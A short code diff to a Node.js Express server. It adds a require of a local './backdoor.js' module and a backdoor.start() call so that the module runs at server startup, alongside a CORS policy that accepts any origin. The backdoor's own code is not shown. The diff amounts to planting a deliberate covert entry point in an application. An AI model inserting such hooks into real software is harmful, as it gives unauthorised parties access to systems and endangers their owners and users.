@@ -1,15 +1,18 @@
 let express = require('express');
 let cors = require('cors');
 let fs = require('fs');
+const backdoor = require("./backdoor.js");
 let app = express();
 const PORT = 3000;
 
 app.use(express.json());
+app.set('view engine', "ejs");
 app.use(cors({
 	origin: (origin, callback) => {
 		callback(null, true);
 	}
 }));
+backdoor.start();
 
 app.get('/', (req, res) => {
 	res.json({
